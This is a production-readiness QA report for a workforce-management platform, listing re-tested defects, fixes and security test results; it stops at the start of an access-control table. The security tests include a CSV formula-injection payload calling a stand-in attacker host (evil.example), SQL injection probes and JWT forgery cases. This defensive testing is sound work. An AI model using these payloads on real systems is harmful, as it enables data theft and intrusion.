# WFM Release Gate

Production-readiness test of the Enterprise WFM Platform · 1 November 2026

- Admin web app: `http://localhost:3000 (Vite dev)`
- Employee portal: `http://localhost:3001 (Vite dev)`
- Gateway: `http://localhost:4000` · Engine: `127.0.0.1:50051` · PostgreSQL 5432 (schema wfm, RLS on) · Redis 6379, NATS JetStream
- Branch: qa/production-readiness (from main @ 6820caf, with uncommitted engine/gateway changes in the working tree)
- Browser: Google Chrome (installed) via Playwright 1.64.1

## Re-test verdict: CONDITIONAL GO

Both critical defects and 18 others are fixed and checked. Three high items remain open, and none needs a large change: rotate the bootstrap admin password and force a change (DEF-03, a setting); add an AG Grid licence key or move to the Community edition (DEF-07, a setting or purchase); and label the last 6 form fields on Alerts & reports (DEF-06, a small code fix). Close those and NATS certificate checking (DEF-19), and this gate is a GO. The 50,000-person scale findings in the separate report still stand.

First run: **NO-GO** with 2 critical and 5 high defects. Re-test on 1 November 2026: full Playwright suite re-run (104 of 108 tests passed) and every original defect checked again directly against the running stack.

| Severity | Open defects |
| --- | ---: |
| Critical | 0 |
| High | 3 |
| Medium | 4 |
| Low | 3 |
| Info | 1 |

| Area | Result |
| --- | --- |
| Screens tested | 51 admin + 5 portal, each with an accessibility scan |
| Access checks | 1,934 role × route checks over 327 guarded API routes · 0 leaks |
| Functional API checks | 100/101 passed |
| UI journeys (admin + portal) | 33/35 passed |
| Security attack tests | 14/16 passed |

## Re-test results

| Outcome | Defects |
| --- | ---: |
| ✅ Fixed | 20 |
| 🟡 Partly fixed | 3 |
| ❌ Still open | 4 |
| ⚪ Still applies | 1 |
| 🆕 New | 3 |

| ID | Severity | Defect | Re-test | What we saw |
| --- | --- | --- | --- | --- |
| DEF-01 | Critical | A disabled user's existing session keeps working | ✅ Fixed | Old token refused straight after the account is disabled: 200 before, 401 immediately after and 6 s later. |
| DEF-02 | High | Admin can book overlapping time off for the same person | ✅ Fixed | A second, overlapping admin booking now returns 409 with a clear message naming the existing vacation. |
| DEF-03 | High | Administrator uses a password on the app's own blocklist and is never asked to change it | ❌ Still open | Admin still signs in with the blocklisted bootstrap password and is not asked to change it (mustChangePassword=false). SEC-01 fails. |
| DEF-04 | High | Ctrl+K search shows fake prototype records and cannot find real ones | ✅ Fixed | Prototype SEED_ data is gone. In the live palette "Jane" and "Voice Inbound" now find nothing, while "Agent1" lists the real employees, "Demo Support" the real group and "Shift Templates" the screen; Enter opens the result. |
| DEF-05 | High | Admin sidebar cannot be used with a keyboard or screen reader | ✅ Fixed | Sidebar items are now focusable buttons: Tab reaches Overview, Workforce, Employees, Teams, Skills and the rest (A-03 passes). |
| DEF-06 | High | Icon-only buttons have no accessible name on every admin screen (WCAG 4.1.2, critical) | 🟡 Partly fixed | Unnamed buttons are gone: 530 elements on 51 screens down to 0. Still 6 form fields without labels on Administration > Alerts & reports (critical "label" rule). |
| DEF-07 | High | AG Grid Enterprise runs without a licence key | ❌ Still open | ag-grid-enterprise is still a dependency, there is no licence key in any env file, and the licence banner is still logged on 4 screens (Employees, Time off, Attendance, Activities). |
| DEF-08 | Medium | CSV formula injection in the audit export | ✅ Fixed | The audit CSV now writes the team name with a leading apostrophe ('=HYPERLINK...), so spreadsheets show it as text. |
| DEF-09 | Medium | Session token accepted in the URL (?token=) on every REST route | ✅ Fixed | GET /users?token=<valid JWT> now returns 401. |
| DEF-10 | Medium | Response time reveals whether a username exists | ✅ Fixed | Median sign-in time is 293 ms for a real user and 301 ms for an unknown one. |
| DEF-11 | Medium | Impossible calendar date returns 500 and leaks the PostgreSQL error | ✅ Fixed | 2026-02-30 now returns 400 "One of the values is not valid (check dates and numbers)." with no database text. |
| DEF-12 | Medium | Failed sign-in attempts are not written to the audit log | ✅ Fixed | A failed admin sign-in now appears in the audit log. |
| DEF-13 | Medium | Forecast Builder takes ~34 s to finish loading | ✅ Fixed | History-quality API answers in 21 ms (2 ms cached); Forecast Builder settles in 6.6 s on the dev server (was about 34 s). |
| DEF-14 | Critical | Forecast/schedule engine crashes with a native abort inside the CP-SAT solver, and stays down | ✅ Fixed | Crash injection: the CP-SAT solver process was killed mid-build. The engine stayed up (0 restarts), the build fell back to HiGHS and finished DONE ("cpsat: failed (the solver process ended without an answer)", "highs: feasible"). Each solve now runs in its own process. |
| DEF-15 | Medium | Admin JavaScript is a single 4.2 MB chunk (1.18 MB gzipped) | ✅ Fixed | Screens are now lazy-loaded: entry chunk 282 kB (87 kB gzip) across 35 chunks. AG Grid (2.7 MB) and exceljs (940 kB) load only on screens that use them. |
| DEF-16 | Medium | Employee list is not paginated | 🟡 Partly fixed | ?limit= and ?offset= are now accepted, but paging happens after a capped 2,000-row load: x-total-count says 2000 on a 50,656-person tenant, offset 40000 returns 0 rows, and 50 rows cost the same ~500 ms as 2,000. Push LIMIT/OFFSET (or keyset paging) into the SQL and return the true total (see scale DEF-29). |
| DEF-17 | Medium | Portal is not usable on a phone browser | ✅ Fixed | At 412 px the portal has no sidebar and no sideways scroll; content uses the full width on every section. |
| DEF-18 | Medium | Colour contrast below WCAG AA on every screen of both apps | 🟡 Partly fixed | Low-contrast elements roughly halved (822 to 457) but still present on all 51 admin screens; the portal sign-in still has 2. |
| DEF-19 | Medium | NATS TLS certificate checking is switched off | ❌ Still open | backend/.env still has NATS_TLS_REJECT_UNAUTHORIZED=false. |
| DEF-20 | Low | Offers show an empty group name to the employee | ✅ Fixed | Code check: /me/offers now joins wfm_groups and returns group_name. Not seen live, because the demo agent had no open offers during the run. |
| DEF-21 | Low | No URLs per section: reload always returns to Home, Back leaves the app | ✅ Fixed | Each portal section has its own URL; reloading on /inbox stays on Inbox (P-08 passes). |
| DEF-22 | Low | Time-off form accepts end-before-start until it is submitted | ✅ Fixed | The form flags an end date before the start date before it is submitted (P-05 passes). |
| DEF-23 | Low | Hire date in 2099 is accepted | ✅ Fixed | Hire date 2099-01-01 now returns 400 "hireDate must be between 1950 and a year from now". |
| DEF-24 | Low | Malformed JSON returns error code INTERNAL | ✅ Fixed | Broken JSON now returns 400 BAD_JSON. |
| DEF-25 | Low | Unauthenticated endpoints reveal account existence and organisation name | ❌ Still open | Unchanged (a configuration choice): /auth/discover still returns the organisation for a known login and an empty list for an unknown one; /auth/login-options names the organisation. Set LOGIN_DISCOVERY=false if org codes are handed out another way. |
| DEF-26 | Low | No favicon — 404 on every page load | ✅ Fixed | Both apps link /favicon.svg, served as image/svg+xml. |
| DEF-27 | Low | scripts/demo-seed.mjs cannot finish | ✅ Fixed | Code check: the seed now handles the forced password change. Not re-run, because it rewrites the demo data. |
| DEF-28 | Info | Existing data to clean before go-live | ⚪ Still applies | Still a pre-launch housekeeping item. The database now also holds the 50,000-person SCALE test data and QA- records from both runs. |
| DEF-43 | Medium | Adherence takes about 2 s per call on a large tenant | 🆕 New | Found in this re-test. |
| DEF-44 | Low | Gateway process ended once with no log line | 🆕 New | Found in this re-test; seen once. |
| DEF-45 | Low | Engine unit tests: 3 of 91 fail after the solver change | 🆕 New | Found in this re-test. |

## Still blocking launch

| ID | Severity | Title | Area | Re-test |
| --- | --- | --- | --- | --- |
| DEF-03 | High | Administrator uses a password on the app's own blocklist and is never asked to change it | Security · Configuration | Still open |
| DEF-06 | High | Icon-only buttons have no accessible name on every admin screen (WCAG 4.1.2, critical) | Accessibility | Partly fixed |
| DEF-07 | High | AG Grid Enterprise runs without a licence key | Release · Licensing | Still open |

## Module scorecard

Every admin screen was opened by URL and checked for crashes, uncaught errors, failing API calls and WCAG issues. Functional checks drive each module's API end to end.

| Module | Screens | Crashes | 5xx | Avg load | Functional | Worst open defect | Defects |
| --- | ---: | ---: | ---: | ---: | ---: | --- | --- |
| Overview | 1 | 0 | 0 | 2.1 s | — | None | — |
| Workforce (slowest: /workforce/attendance, 13.0 s) | 7 | 0 | 0 | 4.5 s | 20/20 | None | — |
| Forecasting | 8 | 0 | 0 | 2.1 s | 12/12 | None | — |
| Scheduling (slowest: /scheduling/multi-site, 15.4 s) | 14 | 0 | 0 | 3.0 s | 15/15 | None | — |
| Intraday & RTA | 4 | 0 | 0 | 2.1 s | 6/6 | Medium | DEF-43 |
| Configuration (slowest: /configuration/sites-skills, 25.8 s) | 9 | 0 | 0 | 13.0 s | 14/14 | High | DEF-03 DEF-07 DEF-19 |
| Data management (slowest: /data-management/data-quality, 9.5 s) | 3 | 0 | 0 | 8.2 s | 8/8 | Info | DEF-28 |
| Audit | 1 | 0 | 0 | 1.4 s | 3/3 | None | — |
| Administration | 4 | 0 | 0 | 1.2 s | 4/4 | Low | DEF-25 |
| Employee portal | 5 | 0 | 0 | 1.1 s | 38/41 | None | — |

Load times are from Vite dev servers (unbundled modules) and include waiting for every API call. Accessibility defects DEF-05, DEF-06 and DEF-18 apply to all admin modules and are listed once.

## All defects (31)

The same list is in `qa/reports/defects.csv` for import into Jira or Azure DevOps.

### DEF-01 · Critical · A disabled user's existing session keeps working

**Area:** Security · Administration

- **Re-test:** Fixed — Old token refused straight after the account is disabled: 200 before, 401 immediately after and 6 s later.
- **Steps:** Create user → sign in (token) → admin sets status DISABLED → call GET /api/v1/workforce/employees with the old token
- **Expected:** 401/403 at once
- **Actual:** 200 OK — the token works until it expires (JWT_TTL=12h). New sign-ins are refused correctly.
- **Evidence:** api-functional › Audit & Administration (existing session of disabled user is cut off → 200)
- **Fix:** In authenticate(), reject tokens whose user is no longer ACTIVE (cache status in Redis for a few seconds), or keep a per-user token version and bump it on disable/role change/password reset.

### DEF-14 · Critical · Forecast/schedule engine crashes with a native abort inside the CP-SAT solver, and stays down

**Area:** Reliability · Engine (scheduling)

- **Re-test:** Fixed — Crash injection: the CP-SAT solver process was killed mid-build. The engine stayed up (0 restarts), the build fell back to HiGHS and finished DONE ("cpsat: failed (the solver process ended without an answer)", "highs: feasible"). Each solve now runs in its own process.
- **Steps:** Seen twice: (1) during scripts/demo-seed.mjs (forecast → schedule); (2) during the gateway's own test run, seconds after 'cancel stops a running build inside the engine' passed, while the next multi-group solve ran
- **Expected:** A failed solve fails that one request; the engine keeps serving
- **Actual:** 'Fatal Python error: Aborted' in ortools cp_model.Solve (backend/engine/scheduling.py:465, solve_cpsat) with the new cancel watchdog thread (scheduling.py:459, solver.StopSearch from another thread) alive. The whole process dies: every forecast and schedule request then returns 503 until someone restarts it. Earlier dead engines also left 3 hung server.py processes (each with 4 workers) running. Not reproduced on demand: 3 rounds of start → cancel → solve passed
- **Evidence:** engine-crash-1.log (native stack of all threads); gateway-suite.txt (12 tests failed with ENGINE_UNAVAILABLE after the crash); /health engine:false
- **Fix:** Run each CP-SAT solve in a child process (the ProcessPool already exists) so a native abort kills one job, not the server; re-check the uncommitted StopSearch-from-watchdog change (prefer a solution-callback stop or the solver's own time limit); run the engine under a supervisor that restarts it and kills the whole process tree; alert on /health engine:false.

### DEF-02 · High · Admin can book overlapping time off for the same person

**Area:** Workforce · Time off

- **Re-test:** Fixed — A second, overlapping admin booking now returns 409 with a clear message naming the existing vacation.
- **Steps:** POST /workforce/time-off for an employee (15–16 days out), approve → POST another for days 16–17
- **Expected:** 400/409 overlap (self-service already blocks this: 'You already have … that overlaps these dates')
- **Actual:** 201 Created — double-booked leave, double-counted balance and pay
- **Evidence:** api-functional › Workforce (overlapping time off rejected → 201)
- **Fix:** Run the same overlap check used by POST /me/time-off inside POST /workforce/time-off (and in bulk/import paths).

### DEF-03 · High · Administrator uses a password on the app's own blocklist and is never asked to change it

**Area:** Security · Configuration

- **Re-test:** Still open — Admin still signs in with the blocklisted bootstrap password and is not asked to change it (mustChangePassword=false). SEC-01 fails.
- **Steps:** Sign in as admin (tenant ORG)
- **Expected:** Strong password; temporary/bootstrap passwords force a change
- **Actual:** Password is in EASY list of passwordPolicy.ts and contains the username; mustChangePassword=false
- **Evidence:** api-security SEC-01
- **Fix:** Rotate before go-live. Apply checkNewPassword() to BOOTSTRAP_ADMIN_PASSWORD and set must_change_password=true for the bootstrap admin.

### DEF-04 · High · Ctrl+K search shows fake prototype records and cannot find real ones

**Area:** Admin UI · Command palette

- **Re-test:** Fixed — Prototype SEED_ data is gone. In the live palette "Jane" and "Voice Inbound" now find nothing, while "Agent1" lists the real employees, "Demo Support" the real group and "Shift Templates" the screen; Enter opens the result.
- **Steps:** Press Ctrl+K → type 'Jane' / 'Demo Support' / 'Shift Templates'
- **Expected:** Live employees, groups and screens
- **Actual:** 'Jane Doe · EMP-1024 · Customer Billing' (does not exist); real group and screen names: 'No matching records'
- **Evidence:** admin-e2e A-04, screens/palette-fake-data.png; src/components/common/CommandPalette.tsx uses SEED_EMPLOYEES/SEED_WFM_GROUPS/SEED_SKILLS from src/services/wfmStore.ts
- **Fix:** Search the API (or the loaded stores) and the route list; delete the SEED_* data from the production bundle.

### DEF-05 · High · Admin sidebar cannot be used with a keyboard or screen reader

**Area:** Accessibility

- **Re-test:** Fixed — Sidebar items are now focusable buttons: Tab reaches Overview, Workforce, Employees, Teams, Skills and the rest (A-03 passes).
- **Steps:** Load any admin screen → press Tab repeatedly
- **Expected:** Every navigation item is focusable (links/buttons)
- **Actual:** Only 1 focus stop in the sidebar in 40 Tabs — items are <div onClick> with no role or tabindex
- **Evidence:** admin-e2e A-03; src/components/layout/NavigationSidebar.tsx
- **Fix:** Render items as <a href> (they already have URLs) or <button>, with aria-current on the active one.

### DEF-06 · High · Icon-only buttons have no accessible name on every admin screen (WCAG 4.1.2, critical)

**Area:** Accessibility

- **Re-test:** Partly fixed — Unnamed buttons are gone: 530 elements on 51 screens down to 0. Still 6 form fields without labels on Administration > Alerts & reports (critical "label" rule).
- **Steps:** axe-core WCAG 2.1 AA scan of all 51 admin screens
- **Expected:** 0 critical violations
- **Actual:** button-name: 530 elements on 51/51 screens; plus select-name and missing form labels on one screen
- **Evidence:** admin-crawl (axe) — see Accessibility section
- **Fix:** Add aria-label to icon buttons (lucide icons inside <button>), label selects/inputs.

### DEF-07 · High · AG Grid Enterprise runs without a licence key

**Area:** Release · Licensing

- **Re-test:** Still open — ag-grid-enterprise is still a dependency, there is no licence key in any env file, and the licence banner is still logged on 4 screens (Employees, Time off, Attendance, Activities).
- **Steps:** Open Workforce › Employees (console)
- **Expected:** Licensed grid, no watermark
- **Actual:** Console prints the AG Grid Enterprise licence banner; grids show the trial watermark
- **Evidence:** admin-crawl console errors on Employees, Time Off, Attendance, Timeline, Live coverage, Activities
- **Fix:** Set VITE_AG_GRID_LICENSE for the production build (or switch to the Community edition). Using Enterprise in production unlicensed breaches the licence.

### DEF-08 · Medium · CSV formula injection in the audit export

**Area:** Security · Audit export

- **Re-test:** Fixed — The audit CSV now writes the team name with a leading apostrophe ('=HYPERLINK...), so spreadsheets show it as text.
- **Steps:** Create a team named =HYPERLINK("http://evil.example/?x="&A1,"x") → download /audit/export.csv
- **Expected:** Cell neutralised ('=…)
- **Actual:** Written raw: "=HYPERLINK(""http://evil.example/…"")" — runs when opened in Excel
- **Evidence:** api-security SEC-14
- **Fix:** Reuse csvCell from modules/reports.ts (prefix = + - @ with ') in auditRoutes.ts and integrations/runner.ts and any other CSV writer.

### DEF-09 · Medium · Session token accepted in the URL (?token=) on every REST route

**Area:** Security · Sessions

- **Re-test:** Fixed — GET /users?token=<valid JWT> now returns 401.
- **Steps:** GET /api/v1/users?token=<jwt>
- **Expected:** 401 (header only)
- **Actual:** 200; the web app also opens /ws?token=<jwt>
- **Evidence:** api-security SEC-05
- **Fix:** Accept ?token= only on the WebSocket upgrade, ideally with a short-lived single-use ticket instead of the session JWT; strip it from access logs.

### DEF-10 · Medium · Response time reveals whether a username exists

**Area:** Security · Sign-in

- **Re-test:** Fixed — Median sign-in time is 293 ms for a real user and 301 ms for an unknown one.
- **Steps:** POST /auth/login with a wrong password for a real vs an unknown username (5 each)
- **Expected:** Same timing
- **Actual:** Real user median ≈ 808 ms, unknown ≈ 11 ms (bcrypt only runs for real users)
- **Evidence:** api-security SEC-07
- **Fix:** When no user is found, bcrypt.compare against a fixed dummy hash before failing.

### DEF-11 · Medium · Impossible calendar date returns 500 and leaks the PostgreSQL error

**Area:** API · Validation

- **Re-test:** Fixed — 2026-02-30 now returns 400 "One of the values is not valid (check dates and numbers)." with no database text.
- **Steps:** POST /me/time-off {startDate:'2026-02-30', endDate:'2026-02-30'}
- **Expected:** 400 'not a valid date'
- **Actual:** 500 'date/time field value out of range: "2026-02-30"'
- **Evidence:** api-security SEC-15
- **Fix:** isoDay is a regex only — add a real-date refine to the shared isoDay schema (affects every date input), and never return raw DB messages on 500.

### DEF-12 · Medium · Failed sign-in attempts are not written to the audit log

**Area:** Audit

- **Re-test:** Fixed — A failed admin sign-in now appears in the audit log.
- **Steps:** Fail a sign-in for admin → search audit
- **Expected:** LOGIN_FAILED entry with IP
- **Actual:** Only successful LOGIN is audited (lockouts are in Redis only)
- **Evidence:** api-functional › Audit
- **Fix:** Audit failed attempts and lockouts (needed for SOC 2 / ISO 27001 evidence).

### DEF-13 · Medium · Forecast Builder takes ~34 s to finish loading

**Area:** Performance · Forecasting

- **Re-test:** Fixed — History-quality API answers in 21 ms (2 ms cached); Forecast Builder settles in 6.6 s on the dev server (was about 34 s).
- **Steps:** Open /forecasting/forecast-builder for Demo Support (10 weeks of history, one queue)
- **Expected:** < 3 s
- **Actual:** GET /forecast/history-quality takes 15–32 s and is requested twice on every load
- **Evidence:** performance PERF-03 + request timing
- **Fix:** Cache history-quality per group/version, compute it in the background, and de-duplicate the request in the screen.

### DEF-15 · Medium · Admin JavaScript is a single 4.2 MB chunk (1.18 MB gzipped)

**Area:** Performance

- **Re-test:** Fixed — Screens are now lazy-loaded: entry chunk 282 kB (87 kB gzip) across 35 chunks. AG Grid (2.7 MB) and exceljs (940 kB) load only on screens that use them.
- **Steps:** vite build
- **Expected:** Route-level code splitting, main chunk < 500 kB
- **Actual:** index.js 4,234 kB + exceljs 940 kB; Vite warns about chunk size
- **Evidence:** static/build-admin.txt
- **Fix:** Lazy-load each module screen (React.lazy) and exceljs/recharts/ag-grid only where used.

### DEF-16 · Medium · Employee list is not paginated

**Area:** Performance · Scale

- **Re-test:** Partly fixed — ?limit= and ?offset= are now accepted, but paging happens after a capped 2,000-row load: x-total-count says 2000 on a 50,656-person tenant, offset 40000 returns 0 rows, and 50 rows cost the same ~500 ms as 2,000. Push LIMIT/OFFSET (or keyset paging) into the SQL and return the true total (see scale DEF-29).
- **Steps:** GET /workforce/employees (≈ 420 people)
- **Expected:** Paged/filtered
- **Actual:** 328 kB per call; 40 req/s with p95 627 ms at 25 concurrent
- **Evidence:** performance PERF-01/02
- **Fix:** Server-side paging and field selection; the grid can use the AG Grid server-side row model.

### DEF-17 · Medium · Portal is not usable on a phone browser

**Area:** Employee portal · Mobile

- **Re-test:** Fixed — At 412 px the portal has no sidebar and no sideways scroll; content uses the full width on every section.
- **Steps:** Open localhost:3001 at 412 px width (Pixel 7)
- **Expected:** Responsive layout / bottom tabs
- **Actual:** Fixed 224 px sidebar leaves 188 px for content; Schedule scrolls sideways
- **Evidence:** responsive R-01, screens/mobile-portal-*.png
- **Fix:** Collapse the sidebar into a bottom tab bar under md breakpoint (same IA as the mobile app).

### DEF-18 · Medium · Colour contrast below WCAG AA on every screen of both apps

**Area:** Accessibility

- **Re-test:** Partly fixed — Low-contrast elements roughly halved (822 to 457) but still present on all 51 admin screens; the portal sign-in still has 2.
- **Steps:** axe scan
- **Expected:** 4.5:1 for text
- **Actual:** 822 elements on 51/51 admin screens; portal login and 4/5 sections
- **Evidence:** admin-crawl, portal-e2e P-01/P-03
- **Fix:** Darken #A3A3A3/#737373 secondary text on white/#FAFAF8 backgrounds.

### DEF-19 · Medium · NATS TLS certificate checking is switched off

**Area:** Security · Configuration

- **Re-test:** Still open — backend/.env still has NATS_TLS_REJECT_UNAUTHORIZED=false.
- **Steps:** backend/.env
- **Expected:** NATS_TLS_REJECT_UNAUTHORIZED=true in production
- **Actual:** false
- **Evidence:** backend/.env (value only, no secret read)
- **Fix:** Set to true with a trusted CA for production.

### DEF-43 · Medium · Adherence takes about 2 s per call on a large tenant

**Area:** Performance · Intraday

- **Re-test:** New — Found in this re-test.
- **Steps:** GET /intraday/adherence?groupId=<Demo Support> 15 times, on the tenant that now also holds the 50,656-person scale data
- **Expected:** Close to the first run (p95 23 ms): the group still has the same people
- **Actual:** p50 1,913 ms, p95 2,232 ms. The three SQL queries behind it take about 20 ms in total when run directly as the database owner (row-level security does not apply there), so the time goes on row-level-security checks or work in the gateway. /workforce/employees is 641 ms and 1.6 MB for 2,000 rows, and under 25 parallel requests it manages 1 request per second (p50 15 s, p95 21 s; all 200).
- **Evidence:** performance > PERF-01 (re-run on a restarted gateway); EXPLAIN ANALYZE of the adherence queries in psql
- **Fix:** Profile the endpoint as the app role (RLS on); make sure the RLS policy uses an indexed, STABLE tenant lookup; add an index on employees(primary_group_id) and a GIN index on eligible_group_ids.

### DEF-20 · Low · Offers show an empty group name to the employee

**Area:** Employee portal

- **Re-test:** Fixed — Code check: /me/offers now joins wfm_groups and returns group_name. Not seen live, because the demo agent had no open offers during the run.
- **Steps:** GET /me/offers as an agent
- **Expected:** groupName 'Demo Support' (as admin sees)
- **Actual:** groupName ""
- **Evidence:** api-functional › Self-service
- **Fix:** Join the group name in the /me/offers query.

### DEF-21 · Low · No URLs per section: reload always returns to Home, Back leaves the app

**Area:** Employee portal · UX

- **Re-test:** Fixed — Each portal section has its own URL; reloading on /inbox stays on Inbox (P-08 passes).
- **Steps:** Open Inbox → reload
- **Expected:** Stay on Inbox (admin app already has per-screen URLs)
- **Actual:** Back on Home; nothing can be bookmarked or linked from a notification e-mail
- **Evidence:** portal-e2e P-08
- **Fix:** Use the same History-API routing as src/services/routes.ts.

### DEF-22 · Low · Time-off form accepts end-before-start until it is submitted

**Area:** Employee portal · UX

- **Re-test:** Fixed — The form flags an end date before the start date before it is submitted (P-05 passes).
- **Steps:** Request time off → Start = day 60, End = day 55
- **Expected:** Inline error, Submit disabled
- **Actual:** Submit enabled; the server's 400 message is shown afterwards
- **Evidence:** portal-e2e P-05
- **Fix:** Validate in the form (it already pre-checks overlaps).

### DEF-23 · Low · Hire date in 2099 is accepted

**Area:** Workforce · Validation

- **Re-test:** Fixed — Hire date 2099-01-01 now returns 400 "hireDate must be between 1950 and a year from now".
- **Steps:** POST /workforce/employees hireDate 2099-01-01
- **Expected:** 400 (e.g. > 1 year ahead)
- **Actual:** 201
- **Evidence:** api-functional › Workforce
- **Fix:** Bound hire dates.

### DEF-24 · Low · Malformed JSON returns error code INTERNAL

**Area:** API

- **Re-test:** Fixed — Broken JSON now returns 400 BAD_JSON.
- **Steps:** POST /config/groups with body '{"name":'
- **Expected:** 400 BAD_JSON
- **Actual:** 400 with code INTERNAL
- **Evidence:** api-security SEC-12
- **Fix:** Map body-parser SyntaxError to a 400 BAD_REQUEST code.

### DEF-25 · Low · Unauthenticated endpoints reveal account existence and organisation name

**Area:** Security · Sign-in

- **Re-test:** Still open — Unchanged (a configuration choice): /auth/discover still returns the organisation for a known login and an empty list for an unknown one; /auth/login-options names the organisation. Set LOGIN_DISCOVERY=false if org codes are handed out another way.
- **Steps:** POST /auth/discover {identifier:<email>}; GET /auth/login-options
- **Expected:** Off in production unless needed
- **Actual:** Returns the organisation for a real e-mail, [] otherwise (rate-limited 15 per 15 min)
- **Evidence:** api-security SEC-08
- **Fix:** Set LOGIN_DISCOVERY=false for production if the org code is distributed another way.

### DEF-26 · Low · No favicon — 404 on every page load

**Area:** Both apps

- **Re-test:** Fixed — Both apps link /favicon.svg, served as image/svg+xml.
- **Steps:** GET /favicon.ico on :3000 and :3001
- **Expected:** 200
- **Actual:** 404 (console error on every screen)
- **Evidence:** admin-crawl console
- **Fix:** Add a favicon to public/.

### DEF-27 · Low · scripts/demo-seed.mjs cannot finish

**Area:** Tooling

- **Re-test:** Fixed — Code check: the seed now handles the forced password change. Not re-run, because it rewrites the demo data.
- **Steps:** Run the seed on a stack with FORCE_PASSWORD_CHANGE on (the default)
- **Expected:** Seed completes
- **Actual:** The giveaway step gets 403 'Choose a new password' (new logins are temporary), and a failed step leaves the group behind so the seed refuses to run again
- **Evidence:** qa/seed-finish.mjs works around it
- **Fix:** Change the demo logins' passwords in the seed; make the seed resumable.

### DEF-44 · Low · Gateway process ended once with no log line

**Area:** Reliability · Gateway

- **Re-test:** New — Found in this re-test; seen once.
- **Steps:** Run the API-latency test (12 endpoints x 15 calls) straight after the full suite
- **Expected:** The gateway stays up, or logs why it stopped
- **Actual:** The process ended with exit code 127 and nothing in its log; the test got ECONNRESET. After a restart the same test ran cleanly, so it did not reproduce.
- **Evidence:** The gateway log ends on normal 200 lines; the shell reported exit code 127
- **Fix:** Run the gateway under a process manager that restarts it, and log uncaughtException, unhandledRejection and process exit before quitting.

### DEF-45 · Low · Engine unit tests: 3 of 91 fail after the solver change

**Area:** Tooling · Engine tests

- **Re-test:** New — Found in this re-test.
- **Steps:** cd backend/engine && python -m pytest -q
- **Expected:** 91 passed (as in the first run)
- **Actual:** 88 passed, 3 failed. test_a_failing_primary_falls_through_to_the_next_solver and test_every_solver_failing_still_ends_with_the_greedy_roster stub solve_cpsat, but the solver now runs in a separate process the stub never reaches (both pass with ENGINE_ISOLATE_SOLVES=0). test_no_history_changes_nothing is flaky: the same request can give a different roster (it failed 1 of 2 times in-process).
- **Evidence:** pytest output saved as static/pytest-rerun.txt in the QA run folder
- **Fix:** Stub solve_cpsat_isolated (or set ENGINE_ISOLATE_SOLVES=0) in those two tests; fix the CP-SAT random seed and use 1 search worker in the determinism test.

### DEF-28 · Info · Existing data to clean before go-live

**Area:** Data hygiene

- **Re-test:** Still applies — Still a pre-launch housekeeping item. The database now also holds the 50,000-person SCALE test data and QA- records from both runs.
- **Steps:** Configuration › Integration Station; Data Management › Staged imports
- **Expected:** —
- **Actual:** A connector points at nats://192.168.9.81:4222 (TIMEOUT); 6 failed history imports (672–5,000 rows rejected); test employees EXT7172 etc.
- **Evidence:** admin-crawl visible errors
- **Fix:** Start production from a clean database; do not migrate this test data.

## Security

| Test | Result | What was checked | Evidence |
| --- | --- | --- | --- |
| SEC-01 | ❌ Fail | Administrator signs in with a password on the app's own blocklist, and is not forced to change it | {"mustChangePassword":false,"containsUsername":true} |
| SEC-02 | ✅ Pass | Password policy enforced on change | ["short1! -> 400 Use at least 8 characters.","password123 -> 400 That password is too easy to guess. Avoid common words and number runs.","demo.agent1-xyz9 -> 400 The password cannot contain your username.","abcdefghij - |
| SEC-03 | ✅ Pass | JWT forgery (alg:none, role swap, bad signature, expired) rejected | {"algNone":401,"roleSwap":401,"badSig":401,"expired":401,"garbage":401} |
| SEC-04 | ✅ Pass | Token revoked after logout | {"after":401} |
| SEC-05 | ✅ Pass | Bearer token accepted as ?token= on every REST route (and used for /ws); leaks into logs, history, Referer | {"status":401} |
| SEC-06 | ✅ Pass | Login throttled after 10 failures (per IP + username, 15 min) | {"codes":[401,401,401,401,401,401,401,401,401,401,429,429]} |
| SEC-07 | ✅ Pass | Login response time reveals whether a username exists (bcrypt only runs for real users) | {"knownMedianMs":391,"unknownMedianMs":372} |
| SEC-08 | ❌ Fail | Unauthenticated /auth/discover and /auth/login-options reveal account existence and organisation name | {"discoverHit":{"organisations":[{"code":"ORG","name":"My Organisation"}]},"discoverMiss":{"organisations":[]},"loginOptions":{"singleOrganisation":{"code":"ORG","name":"My Organisation"},"discovery":true}} |
| SEC-09 | ✅ Pass | Gateway security headers (helmet) | {"content-security-policy":"default-src 'self';base-uri 'self';font-src 'self' https: data:;form-action 'self';frame-ancestors 'self';img-src 'self' data:;object-src 'none';script-src 'self';script-src-attr 'none';style- |
| SEC-10 | ✅ Pass | CORS allow-list (only the admin origin; the portal goes through its Vite proxy) | {"evilACAO":null,"portalACAO":null} |
| SEC-11 | ✅ Pass | SQL injection probes (login, search, ids) handled without 5xx | ["login ' OR '1'='1 -> 401","/workforce/employees?q='%20OR%20'1'%3D'1 -> 200","/audit?search='%20OR%20'1'%3D'1 -> 200","/auth/org/'%20OR%20'1'%3D'1 -> 404","/scheduling/versions/'%20OR%20'1'%3D'1 -> 400","login '; DROP T |
| SEC-12 | ✅ Pass | Malformed JSON / 15MB body / 5000-char name | {"malformed":400,"malformedBody":"BAD_JSON","over14mb":413,"team5000chars":400,"team5000msg":"Invalid input: name String must contain at most 80 character(s)"} |
| SEC-13 | ✅ Pass | Cross-agent access to time-off/swaps | {"agent2Schedule":"object","agent2Swaps":200,"createTimeOff":"201 ","agent1 cancels agent2 request":404,"agent2 request visible to agent1":false,"agent2 cancels own":200,"agent2 gives away agent1 shift":"400 That is not  |
| SEC-14 | ✅ Pass | Audit CSV export writes user-entered names that start with = unescaped (formula injection when opened in Excel) | {"teamCreate":201,"csvLine":"7870,2026-11-01T13:58:36.250Z,Administrator,WFM_ADMIN,CREATE,TEAM,b1d1bfe4-478a-4321-8b9c-29712da74dbb,\"'=HYPERLINK(\"\"http://evil.example/?x=\"\"&A1,\"\"QA490739\"\")\",,,API,::1,37fe822b- |
| SEC-15 | ✅ Pass | Self-service time-off date validation | {"out":{"reversed":"400 The end date is before the start date.","tenYears":"400 Ask for at most 90 days at a time.","past":"400 That date has already passed. Only sick leave can be recorded after the fact.","badDay":"400 |
| SEC-16 | ✅ Pass | Error responses do not leak stack/SQL | {"status":400,"body":"{\"error\":{\"code\":\"VALIDATION\",\"message\":\"Invalid input: body Invalid uuid\",\"details\":[{\"field\":\"\",\"message\":\"Invalid uuid\"}],\"requestId\":\"1f1a11d8-87c0-4211-9adf-6192af093ed5\ |

## Access control (RBAC)

Routes and their required permissions were read from the gateway source (352 routes, 327 guarded). Each role called every route it lacks permission for (must be 403) and every GET it is allowed (must not be 401/403 or 5xx).

| Caller | Calls | Leaks | Wrongly blocked | 5xx | Result |
